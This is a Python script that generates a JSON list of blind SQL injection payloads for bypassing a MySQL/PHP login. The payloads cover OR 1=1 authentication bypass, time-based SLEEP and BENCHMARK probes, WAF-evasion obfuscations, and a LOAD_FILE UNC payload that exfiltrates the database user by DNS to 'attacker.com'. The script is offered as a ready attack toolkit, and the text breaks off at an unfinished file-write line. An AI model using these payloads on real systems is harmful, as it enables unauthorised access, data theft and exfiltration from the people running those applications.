import json, urllib.parse
from datetime import datetime

def gen():
    p={"boolean_true":[],"boolean_false":[],"time_based":[],"obfuscated":[],"metadata":{}}
    # Boolean TRUE
    for payload in ["admin' OR 1=1-- ","' OR 1=1-- ",'admin" OR 1=1-- ',"admin' OR 1=1#","admin' OR '1'='1'-- ","admin'OR 1=1-- ","admin'/**/OR/**/1=1/**/--","admin'%09OR%091=1--%09","admin'%0aOR%0a1=1--%0a","admin' AND 1=1-- ","admin' OR SUBSTR(user(),1,1)='r'-- ","admin' OR IF(1=1,1,0)-- ","admin' OR CHAR(49)=CHAR(49)-- ","admin' OR 0x31=0x31-- ","admin' OR LENGTH(user())>0-- ","admin' || 1=1-- ","admin' OR 1 LIKE 1-- ","admin') OR 1=1-- "]:
        p["boolean_true"].append({"payload":payload,"description":"OR 1=1 variations","technique":"boolean_true","detection":"Login success"})
    # Boolean FALSE
    for payload in ["admin' OR 1=0-- ","admin' OR '1'='0'-- ","admin' OR 'a'='b'-- ","admin' AND 1=0-- ","admin' OR 2+2=5-- "]:
        p["boolean_false"].append({"payload":payload,"description":"False conditions","technique":"boolean_false","detection":"Login failure baseline"})
    # Time-based
    for payload in ["admin' OR SLEEP(5)-- ","admin' OR IF(1=1, SLEEP(5), 0)-- ","admin' AND SLEEP(5)-- ","admin' OR BENCHMARK(1000000,MD5(1))-- ","admin' OR IF(SUBSTR(user(),1,1)='r', SLEEP(5), 0)-- ","admin' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)-- "]:
        p["time_based"].append({"payload":payload,"description":"Time delay","technique":"time_based","detection":"5s+ delay"})
    # Obfuscated
    for payload in ["admin'%20OR%201=1--%20","admin'%09OR%091=1--%09","admin'/**/OR/**/1=1/**/--","admin' /*!OR*/ 1=1--","admin' OORR 1=1--","admin' OR CONCAT('a','d','m','i','n')='admin'-- ","admin' OR CHAR(97,100,109,105,110)='admin'--","admin' OR 0x61646d696e='admin'--"]:
        p["obfuscated"].append({"payload":payload,"description":"Filter bypass","technique":"obfuscation","detection":"Bypass WAF"})
    # Add more variations for each category
    extra_true=["admin' OR 1=1;%00","admin\" OR 1=1;%00","admin' OR 'a'='a'-- ","admin' OR 1=1 AND '1'='1'-- ","admin' OR (1=1 AND 2=2)-- ","admin' OR MID(user(),1,1)='r'-- ","admin' OR LEFT(user(),1)='r'-- ","admin' OR RIGHT(user(),1)='t'-- ","admin' OR LENGTH(database())>0-- ","admin' OR CASE WHEN 1=1 THEN 1 ELSE 0 END-- ","admin' OR UNHEX('31')=UNHEX('31')-- ","admin' OR 'admin'=CHAR(97,100,109,105,110)-- ","admin' OR 1 IN (1)-- ","admin' OR 1 BETWEEN 0 AND 2-- ","admin') OR (1=1)-- ","admin')) OR 1=1-- ","admin' OR %31=%31-- ","admin' OR%20(1)=%20(1)-- "]
    for payload in extra_true:
        p["boolean_true"].append({"payload":payload,"description":"Extended true","technique":"boolean_true","detection":"Login success"})
    extra_false=["admin' OR 1=0#","admin' AND '1'='0'-- ","admin' OR 1=1 AND 1=0-- ","admin' OR 1=0 AND 1=1-- ","admin' OR 1=2-- ","admin' OR 'x' LIKE 'y'-- "]
    for payload in extra_false:
        p["boolean_false"].append({"payload":payload,"description":"Extended false","technique":"boolean_false","detection":"Login failure baseline"})
    extra_time=["admin' OR IF(1=0, SLEEP(5), 0)#","admin' OR 1=1 AND SLEEP(5)-- ","admin' OR IF(1=1, BENCHMARK(1000000,SHA1(1)), 0)-- ","admin' OR BENCHMARK(5000000,RAND())-- ","admin' OR GET_LOCK('test', 10)-- ","admin' OR IF(IS_FREE_LOCK('test'), SLEEP(5), 0)-- ","admin' OR SLEEP(5) #","admin' OR SLEEP(5)/*","admin' OR IF(LENGTH(database())>0, SLEEP(5), 0)-- ","admin' OR IF(ASCII(SUBSTR(user(),1,1))=114, SLEEP(5), 0)-- ","admin'OR(SLEEP(5))--","admin'OR/**/SLEEP(5)/**/--","admin' UNION SELECT SLEEP(5)-- ","admin'; SELECT SLEEP(5)-- "]
    for payload in extra_time:
        p["time_based"].append({"payload":payload,"description":"Extended time","technique":"time_based","detection":"Response delay"})
    extra_obf=["admin'%0bOR%0b1=1--%0b","admin'%a0OR%a01=1--%a0","admin'%0d%0a1=1--","admin'%0c1=1--","admin'OR%20(1)>(0)--","admin'OR(1)LIKE(1)--","admin'OR(1)=(1)--","admin'OR((1))=((1))--","admin'OR~0--","admin'OR!0--","admin' /*!50000OR*/ 1=1--","admin' /*!12345UNION*/ SELECT 1--","admin'/*!--/*%%**OR***/1=1--","admin' Oorr 1=1--","admin' ANANDD 1=1--","admin' /*!OR*/ /*!1*/=/*!1*/--","admin' OR/**_**/1=1--","admin' OR%23%0a1=1--","admin' OR/**//**/1=1--","admin' OR/*test*/1=1--","admin' OR 'a'=CHAR(97)--","admin' OR CONCAT(CHAR(97),CHAR(100))='ad'--","admin' UNION ALL SELECT 1,2,3-- ","admin' /*!UNION*/ /*!SELECT*/ 1,2--","admin' AND (SELECT 1 FROM (SELECT SLEEP(5))A)--","admin' OR (SELECT COUNT(*) FROM information_schema.tables)--","admin' OR LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.attacker.com\\\\test'))--"]
    for payload in extra_obf:
        p["obfuscated"].append({"payload":payload,"description":"Extended obf","technique":"obfuscation","detection":"Filter bypass"})
    total=len(p["boolean_true"])+len(p["boolean_false"])+len(p["time_based"])+len(p["obfuscated"])
    p["metadata"]={"total_payloads":total,"php_version":"5.6","dbms":"MySQL","generated_date":datetime.now().isoformat(),"categories":{"boolean_true":len(p["boolean_true"]),"boolean_false":len(p["boolean_false"]),"time_based":len(p["time_based"]),"obfuscated":len(p["obfuscated"])},"note":"Use boolean_false as baseline"}
    return p

payloads=gen()
with open("blind_sqli_payloads.json","w",encoding="utf-8") as f:
